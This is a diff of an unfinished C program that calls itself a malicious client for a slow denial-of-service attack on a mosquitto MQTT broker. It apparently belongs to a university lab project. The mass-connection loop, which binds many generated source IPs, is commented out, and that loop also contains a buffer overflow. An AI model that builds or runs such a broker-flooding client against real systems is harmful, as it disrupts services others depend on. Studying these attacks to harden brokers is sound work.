@@ -3,38 +3,68 @@
 #include "string.h"
 #include "unistd.h"
 #include <mosquitto.h>
+#include <argp.h>
 
+const char *argp_program_version = "slow-dos-mosquitto 1.0.0";
+static char doc[] = "This script's purpose is to implement a malicious client for a SlowDoS attack on the mosquitto implemenation of an MQTT broker.";
+const char *argp_program_bug_address = "patricia.horvath@tum.de";
+//TODO
+static char args_doc[] = "";
+static struct argp_option options[] = {
+        {"help", 'h', 0, 0, "Print help"},
+        {"source_ip", 's', "source_ip", 0, "Specify source IP address of the client"},
+        {0}
+};
 
+struct arguments {
+    int help;
+    char *args[1];
+    char *source_ip[9];
+};
 
+// TODO adjust options
+static error_t parse_opt(int key, char *arg[], struct argp_state *state){
+    struct arguments *arguments = state->input;
+    switch(key) {
+        case 'h':
+            arguments->help = 1;
+            break;
+        /*case 's':
+            arguments->source_ip = arg;
+            break;*/
 
-// TODO: make command adjustable with options and stuff
-/*void parse_parameters(char *argv[]) {
-    int length = sizeof(argv) / sizeof(argv[0]);
-    int port;
-    port = 1883;
-    int keepAlive;
-    keepAlive = 60;
+        case ARGP_KEY_ARG:
+            // Too many arguments, if your program expects only one argument.
+            if(state->arg_num > 1)
+                argp_usage(state);
+            arguments->args[state->arg_num] = arg;
+            break;
 
-    // no parameters
-    if (length == 1) {
-        printf("Usage: main.c -h [host address] -p [broker port] -k [keep alive]\n");
+        case ARGP_KEY_END:
+            // Not enough arguments. if your program expects exactly one argument.
+            if(state->arg_num < 1)
+                argp_usage(state);
+            break;
+
+        default:
+            return ARGP_ERR_UNKNOWN;
     }
-}*/
+
+    return 0;
+}
+
 
 void on_connect(struct mosquitto *mosq, void *obj, int reason_code) {
 
     int rc;
     printf("on_connect: %s\n", mosquitto_connack_string(reason_code));
     if (reason_code != 0) {
-        /* If the connection fails for any reason, we don't want to keep on
-         * retrying in this example, so disconnect. Without this, the client
-         * will attempt to reconnect. */
+
         mosquitto_disconnect(mosq);
     }
     rc = mosquitto_subscribe(mosq, NULL, "test", 1);
     if (rc != MOSQ_ERR_SUCCESS) {
         fprintf(stderr, "Error subscribing: %s\n", mosquitto_strerror(rc));
-        /* We might as well disconnect if we were unable to subscribe */
         mosquitto_disconnect(mosq);
     }
 
@@ -55,8 +85,6 @@ void on_subscribe(struct mosquitto *mosq, void *obj, int mid, int qos_count, con
         }
     }
     if (have_subscription == false) {
-        /* The broker rejected all of our subscriptions, we know we only sent
-         * the one SUBSCRIBE, so there is no point remaining connected. */
         fprintf(stderr, "Error: All subscriptions rejected.\n");
         mosquitto_disconnect(mosq);
     }
@@ -71,7 +99,7 @@ void on_message(struct mosquitto *mosq, void *obj, const struct mosquitto_messag
 int main(int argc, char *argv[]) {
     struct mosquitto *mosq;
     int rc;
-    struct mosquitto *clients[1025];
+    //struct mosquitto *clients[1025];
 
     /* Required before calling other mosquitto functions */
     mosquitto_lib_init();
@@ -83,9 +111,9 @@ int main(int argc, char *argv[]) {
      * clean session = true -> the broker should remove old sessions when we connect
      * obj = NULL -> we aren't passing any of our private data for callbacks
      */
-    int i = 0;
+    //int i = 0;
     // create maximum number of clients
-    while (i < 1025) {
+    /*while (i < 1025) {
         mosq = mosquitto_new(NULL, true, NULL);
         if (mosq == NULL) {
             fprintf(stderr, "Error: Out of memory.\n");
@@ -93,6 +121,11 @@ int main(int argc, char *argv[]) {
         }
         clients[i] = mosq;
         i = i + 1;
+    }*/
+    mosq = mosquitto_new(NULL, true, NULL);
+    if (mosq == NULL) {
+        fprintf(stderr, "Error: Out of memory.\n");
+        return 1;
     }
 
 
@@ -105,30 +138,128 @@ int main(int argc, char *argv[]) {
      * This call makes the socket connection only, it does not complete the MQTT
      * CONNECT/CONNACK flow, you should use mosquitto_loop_start() or
      * mosquitto_loop_forever() for processing net traffic. */
-    int j;
+    /*int j;
     int ip_addr;
-    printf("Requesting connection for all clients ...\n");
-    for(j=0; j<sizeof(clients)/sizeof(*clients); j++){
-        for(ip_addr=2; ip_addr <=254; ip_addr++){
-            // generate new IP address
-            char ip_addr_end[500];
-            char new_ip_addr[]= "192.168.1.";
-            sprintf(ip_addr_end, "%d", ip_addr);
-            strcat(new_ip_addr, ip_addr_end);
-            rc = mosquitto_connect_bind(clients[j], "192.168.1.1", 1881, 60, new_ip_addr);
-            //printf("IP address is %s\n", new_ip_addr);
-            if (rc != MOSQ_ERR_SUCCESS) {
-                mosquitto_destroy(mosq);
-                fprintf(stderr, "Error: %s\n", mosquitto_strerror(rc));
-                return 1;
+    int count;
+    count = 0;
+    int index_mosq = 0;*/
+    printf("Requesting connection ...\n");
+    /*//for(j=0; j<sizeof(clients)/sizeof(*clients); j++){
+        // start client in 192.168.1.0 subnet
+        while(count < 1025) {
+            for (ip_addr = 2; ip_addr <= 254; ip_addr++) {
+                // generate new IP address
+                char ip_addr_end[500];
+                char new_ip_addr[] = "192.168.1.";
+                sprintf(ip_addr_end, "%d", ip_addr);
+                strcat(new_ip_addr, ip_addr_end);
+                rc = mosquitto_connect_bind(clients[j], "192.168.1.1", 1881, 60, new_ip_addr);
+                //printf("IP address is %s\n", new_ip_addr);
+                if (rc != MOSQ_ERR_SUCCESS) {
+                    mosquitto_destroy(mosq);
+                    fprintf(stderr, "Error: %s\n", mosquitto_strerror(rc));
+                    return 1;
+                }
+                *//*mosquitto_loop_forever(clients[index_mosq], -1, 1);
+                index_mosq++;*//*
             }
-        }
-
+            for (ip_addr = 1; ip_addr <= 254; ip_addr++) {
+                // generate new IP address
+                char ip_addr_end[500];
+                char new_ip_addr[] = "192.168.2.";
+                sprintf(ip_addr_end, "%d", ip_addr);
+                strcat(new_ip_addr, ip_addr_end);
+                rc = mosquitto_connect_bind(clients[j], "192.168.1.1", 1881, 60, new_ip_addr);
+                //printf("IP address is %s\n", new_ip_addr);
+                if (rc != MOSQ_ERR_SUCCESS) {
+                    mosquitto_destroy(mosq);
+                    fprintf(stderr, "Error: %s\n", mosquitto_strerror(rc));
+                    return 1;
+                }
+                mosquitto_loop_forever(clients[index_mosq], -1, 1);
+                index_mosq++;
+            }
+            for (ip_addr = 1; ip_addr <= 254; ip_addr++) {
+                // generate new IP address
+                char ip_addr_end[500];
+                char new_ip_addr[] = "192.168.3.";
+                sprintf(ip_addr_end, "%d", ip_addr);
+                strcat(new_ip_addr, ip_addr_end);
+                rc = mosquitto_connect_bind(clients[j], "192.168.1.1", 1881, 60, new_ip_addr);
+                //printf("IP address is %s\n", new_ip_addr);
+                if (rc != MOSQ_ERR_SUCCESS) {
+                    mosquitto_destroy(mosq);
+                    fprintf(stderr, "Error: %s\n", mosquitto_strerror(rc));
+                    return 1;
+                }
+                *//*mosquitto_loop_forever(clients[index_mosq], -1, 1);
+                index_mosq++;*//*
+            }
+            for (ip_addr = 1; ip_addr <= 254; ip_addr++) {
+                // generate new IP address
+                char ip_addr_end[500];
+                char new_ip_addr[] = "192.168.4.";
+                sprintf(ip_addr_end, "%d", ip_addr);
+                strcat(new_ip_addr, ip_addr_end);
+                rc = mosquitto_connect_bind(clients[j], "192.168.1.1", 1881, 60, new_ip_addr);
+                //printf("IP address is %s\n", new_ip_addr);
+                if (rc != MOSQ_ERR_SUCCESS) {
+                    mosquitto_destroy(mosq);
+                    fprintf(stderr, "Error: %s\n", mosquitto_strerror(rc));
+                    return 1;
+                }
+                *//*mosquitto_loop_forever(clients[index_mosq], -1, 1);
+                index_mosq++;*//*
+            }
+            for (ip_addr = 1; ip_addr <= 254; ip_addr++) {
+                // generate new IP address
+                char ip_addr_end[500];
+                char new_ip_addr[] = "192.168.5.";
+                sprintf(ip_addr_end, "%d", ip_addr);
+                strcat(new_ip_addr, ip_addr_end);
+                rc = mosquitto_connect_bind(clients[j], "192.168.1.1", 1881, 60, new_ip_addr);
+                //printf("IP address is %s\n", new_ip_addr);
+                if (rc != MOSQ_ERR_SUCCESS) {
+                    mosquitto_destroy(mosq);
+                    fprintf(stderr, "Error: %s\n", mosquitto_strerror(rc));
+                    return 1;
+                }
+                *//*mosquitto_loop_forever(clients[index_mosq], -1, 1);
+                index_mosq++;*//*
+            }
+            for (ip_addr = 1; ip_addr <= 9; ip_addr++) {
+                // generate new IP address
+                char ip_addr_end[500];
+                char new_ip_addr[] = "192.168.6.";
+                sprintf(ip_addr_end, "%d", ip_addr);
+                strcat(new_ip_addr, ip_addr_end);
+                rc = mosquitto_connect_bind(clients[j], "192.168.1.1", 1881, 60, new_ip_addr);
+                //printf("IP address is %s\n", new_ip_addr);
+                if (rc != MOSQ_ERR_SUCCESS) {
+                    mosquitto_destroy(mosq);
+                    fprintf(stderr, "Error: %s\n", mosquitto_strerror(rc));
+                    return 1;
+                }
+                *//*mosquitto_loop_forever(clients[index_mosq], -1, 1);
+                index_mosq++;*//*
+            }
+            count++;
+        }*/
+    //printf("Client count is %d\n", count);
+    rc = mosquitto_connect_bind(mosq, "192.168.1.1", 1881, 60, "192.168.1.2");
+    //printf("IP address is %s\n", new_ip_addr);
+    if (rc != MOSQ_ERR_SUCCESS) {
+        mosquitto_destroy(mosq);
+        fprintf(stderr, "Error: %s\n", mosquitto_strerror(rc));
+        return 1;
     }
 
-    /* Run the network loop in a blocking call. The only thing we do in this
-     * example is to print incoming messages, so a blocking call here is fine.
-     *
+
+
+
+    //}
+
+    /* Run the network loop in a blocking call.
      * This call will continue forever, carrying automatic reconnections if
      * necessary, until the user calls mosquitto_disconnect().
      */
